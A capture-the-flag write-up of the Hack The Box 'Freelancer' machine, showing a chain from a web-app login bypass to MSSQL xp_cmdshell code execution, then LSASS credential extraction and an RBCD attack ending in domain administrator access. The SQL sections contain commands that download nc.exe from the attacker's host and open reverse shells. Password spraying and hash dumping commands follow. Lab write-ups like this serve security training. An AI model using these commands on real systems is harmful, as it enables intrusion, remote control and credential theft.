---
title: HTB-Freelancer
draft: false
tags:
  - htb
  - windows
  - hard
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/Freelancer.png)
## Information Gathering
### Rustscan

Rustscan find several ports open. Based on the open ports, this machine seems to be a domain controller:

`rustscan --addresses 10.10.11.5 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image.png)

## Enumeration
### LDAP - TCP 389

We will first enumerate LDAP. 

Let's query base namingcontexts:

`ldapsearch -H ldap://10.10.11.5 -x -s base namingcontexts`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-2.png)

Domain name is discovered to be **freelancer.htb** and we have added it to `/etc/hosts`.

We have tried null-bind on the "DC=freelancer,DC=htb", but it was denied:

`ldapsearch -H ldap://10.10.11.5 -x -b "DC=freelancer,DC=htb"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-4.png)

### RPC - TCP 135

RPC accepts null login but running commands are denied:

`rpcclient -U "" -N 10.10.11.5`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-3.png)


### HTTP - TCP 80

**freelancer.htb** is a website about finding job:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-1.png)

Feroxbuster find bunch of new paths, and `/admin` stand out:

`feroxbuster -u http://freelancer.htb -n -C 404`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-20.png)

Unfortunately, `/admin` access is denied. We would have to come back with different privilege. 

Let's enumerate the website more.

Looking around, we discovered that `/accounts/profile/visit/<number>` brings us to a profile page for a specific user:

`http://freelancer.htb/accounts/profile/visit/3/`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-16.png)

`/accounts/profile/visit/2/` is a page for the **admin**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-15.png)

Now let's check on login features.

We will create a random user account through `/employer/register/`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-5.png)

It seems like admin team has to review the account registration submission and send back email in order for us to successfully activate the account. 

However, HTB machines doesn't interact with the open interent so there is no method for the admin team to send us back the email regarding activation. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-7.png)

Enumerating more, we discovered a way on how to bypass registration activation issue. 

Let's go to login page and move on to "Forgot your password?":

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-9.png)

Fill out the information used for registration:

`http://freelancer.htb/accounts/recovery/`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-8.png)

We are led to page where we can reset the password:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-6.png)

We have changed the password to another one.

For some reason, after resetting the password, we are able to bypass registration activation step and signin to the dashboard as the registered user:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-10.png)

## Dashboard Access as Admin

Let's move on to the profile page on the dashboard:

`http://freelancer.htb/accounts/profile/`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-11.png)

On the most left menu bar, we see a tab for **QR-Code**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-12.png)

QR Code allows the user to login without needing any credentials:

`http://freelancer.htb/employer/otp/qrcode/`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-13.png)

Let's abuse this QR code login feature. 

We will download the QR code and pass it to [CyberChef](https://cyberchef.org/
).

CyberChef decrypts the qr code to text:

`http://freelancer.htb/accounts/login/otp/MTAwMTA=/c6a9833419dc130a2c911af5d6fd6abf/`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-14.png)

We will use base64 to decode it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-21.png)

`MTAwMTA=` decodes into a number `10010` and it semes to be the number for the prifile page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-38.png)

Abusing this, we would be able to obtain the qr code link for the admin and login as the admin. 

We will base64 encode `2` and it is `Mgo=`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-39.png)

Let's modify the QR code link with the value `Mgo=` as such:

`http://freelancer.htb/accounts/login/otp/Mgo=/c6a9833419dc130a2c911af5d6fd6abf/`


Using the modifed link, we can now login as the **admin**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-18.png)

## Shell as sql_svc

Now that we have access as the admin, we can access `/admin` page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-19.png)

**Development Tools** provides **SQL Terminal**.

Let's see if it is interactive:

`SELECT @@VERSION;`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-22.png)

SQL Terminal is interactive and it is running Microsoft SQL Server 2019 on it. 

We can query databases as such:

`SELECT name FROM sys.databases;`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-23.png)

Using the command below, we can query users on SQL:

```sql
SELECT name, type_desc
FROM sys.database_principals
WHERE type IN ('S', 'U', 'G')
AND name NOT LIKE '##%'
ORDER BY type_desc, name;
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-24.png)

### SQL RCE

Spending some time on enumeration, we discovered RCE vulnerability on this SQL terminal.

Using the command below, we can impersonate **sysadmin** and use **xp_cmdshell** to execute commands:

```sql
EXECUTE AS LOGIN = 'sa';

EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC master..xp_cmdshell 'ping 10.10.14.36';

SELECT IS_SRVROLEMEMBER('sysadmin');
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-25.png)

The command above send ICMP packets to our Kali machine and we can verify this through tcpdump:

`sudo tcpdump -i tun0 icmp`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-26.png)

Now that we have verified RCE vulnerability, let's spawn a reverse shell.

Following command will download **nc.exe** from Kali's Python HTTP Server and spawn reverse shell using it:

```sql
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC xp_cmdshell 'curl http://10.10.14.36:8088/nc.exe -o C:\ProgramData\nc.exe';
EXEC xp_cmdshell 'C:\ProgramData\nc.exe 10.10.14.36 1337 -e cmd';

SELECT IS_SRVROLEMEMBER('sysadmin');
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-27.png)

As we run the command, we can observer the target machine grabbing **nc.exe** from our Python web server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-28.png)

After it grabs **nc.exe**, it is used to spawn a reverse shell connection back to our netcat listener:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-29.png)

Now we have a shell as **sql_svc**.

## Privesc: sql_svc to mikasaackerman

Let's see what other uses are on the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-31.png)

There is a bunch. We will make a note of this users for later use. 

Let's hunt for keyword **password** in `C:\Users`:

`for /r C:\Users %f in (*.config *.txt *.xml *.ini) do @findstr /sim /c:password "%f" 2>nul && (type "%f" & echo.)`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-30.png)

It seems like password(**IL0v3ErenY3ager**) is exposed in plain text.

### Password Spray

Since we don't know for whih user this password is being used for, let's spray it to the users on the system:

`crackmapexec smb 10.10.11.5 -u users.txt -p IL0v3ErenY3ager`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-32.png)

We get a valid match for user **mikasaAckerman**:**IL0v3ErenY3ager**

### RunasCs

Now that we know the credentials for user **mikasaAckerman**, let's use it along with **RunasCs.exe** and spawn a revere shell as **mikasaAckerman**.

We modifed the above reverse shell script a little bit so that it will download **RunasCs.exe** and run reverse shell command as the user **mikasaAckerman**:

```sql
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; 
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXEC xp_cmdshell 'curl http://10.10.14.36:8088/nc.exe -o C:\ProgramData\nc.exe';
EXEC xp_cmdshell 'curl http://10.10.14.36:8088/RunasCs.exe -o C:\ProgramData\RunasCs.exe';
EXEC xp_cmdshell 'C:\ProgramData\RunasCs.exe mikasaAckerman IL0v3ErenY3ager "nc.exe 10.10.14.36 1337 -e cmd"';

SELECT IS_SRVROLEMEMBER('sysadmin');
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-17.png)

As we run the above command, we get a shell as **mikasaAckerman**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-33.png)

## Privesc: mikasaackerman to lorra199
### Bloodhound

Now that we have a valid pair of credentials, let's run bloodhound:

`sudo bloodhound-python -u 'mikasaAckerman' -p 'IL0v3ErenY3ager' -d freelancer.htb -dc freelancer.htb -c all -ns 10.10.11.5`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-34.png)

Bloodhound ran successfully, but user **mikasaAckerman** doesn't have any interesting rights on other users.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-40.png)

Let's come back to Bloodhound after we gain foothold of a different user.

### Local Enumeration

Looking around, we discovered **mail.txt** and **MEMORY.7z** from `C:\Users\mikasaAckerman\Desktop`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-35.png)

**mail.txt** goes as below, but we are not show what it mean at this point:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-36.png)

### Memory Dump


After we download **MEMORY.7z** file, we extracted the dump file from it and grabbed **lsass.exe** from it. Using lsass.exe, we were able to extract credentials for user **Lorra199**: **PWN3D#l0rr@Armessa199**

- Memory Dump: Found in MEMORY.7z, containing the dump of the processes of the whole server.
- Mimikatz: Use to extract credentials.
- Extract lsass.exe: Remove the process lsass.exe from the dump, focusing on lsass.exe to dump the SAM.
- SAM Extraction: Find lorra199’s password in the SAM.

You can find the guide that I used over [here](https://diverto.hr/en/blog/en-2019-11-05-Extracting-Passwords-from-hiberfil-and-memdumps/).

Using the credentials found, we can finally evil-winrm inside:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-37.png)

## Privesc: lorra199 to Administrator
### Bloodhound

This user is a member of the AD Recycle Bin and has generic rights on the domain controller.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-41.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-42.png)

We can use this rights to abuse **RBCD**** (resource-based constrained delegation) and impersonate as **Administrator**.

### RBCD Attack

You can read more about this attack [here](https://juggernaut-sec.com/cve-2022-26923-certifried/). 


We will first add a new computer on the domain:

`addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-43.png)

With the new machine account added to the domain, let's use rbcd to grant this PC the rights to impersonate as the user "administrator" if it belongs to the group "domain admins":

`impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-45.png)



The next step is to obtain a service ticket to access the service CIFS.

`getST.py -spn 'cifs/DC$' -impersonate Administrator -dc-ip 10.10.11.5 'freelancer.htb/ATTACKERSYSTEM$:Summer2018!'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-44.png)

Here, we passed “DC$” instead of the full FQDN “DC.freelancer.htb”.

Additionally, we encountered a Kerberos clock skew error. Although attempting to update it using “ntpdate” failed, manually adjusting the clock to match the time of the domain controller resolved the issue.

Let's use the following commands to synchronize the clock with the domain controller:

`sudo ntpdate -u freelancer.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-46.png)

After syncrhoizing the clock, we can obtain service ticket:

`getST.py -spn 'cifs/DC.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 'freelancer.htb/ATTACKERSYSTEM$:Summer2018!'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-47.png)

To retrieve hashes of all users using secretsdump, we can utilize both CIFS and LDAP (verification required for LDAP):

`getST.py -spn 'LDAP/DC.freelancer.htb' -impersonate Administrator -dc-ip 10.10.11.5 'freelancer.htb/ATTACKERSYSTEM$:Summer2018!'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-48.png)

Let's export the path to the obtained tickets:

`export KRB5CCNAME=/home/yoon/Documents/htb/freelancer/Administrator.ccache`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-49.png)

With the obtained tickets, we can dump all the hashes using secretsdump:

`secretsdump.py 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-50.png)

We finally have the shell as the administrator:

`evil-winrm -i 10.10.11.5 -u administrator -H 0039318f1e8274633445bce32ad1a290`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/freelancer/image-51.png)

## References
- https://diverto.hr/en/blog/en-2019-11-05-Extracting-Passwords-from-hiberfil-and-memdumps/
- https://juggernaut-sec.com/cve-2022-26923-certifried/
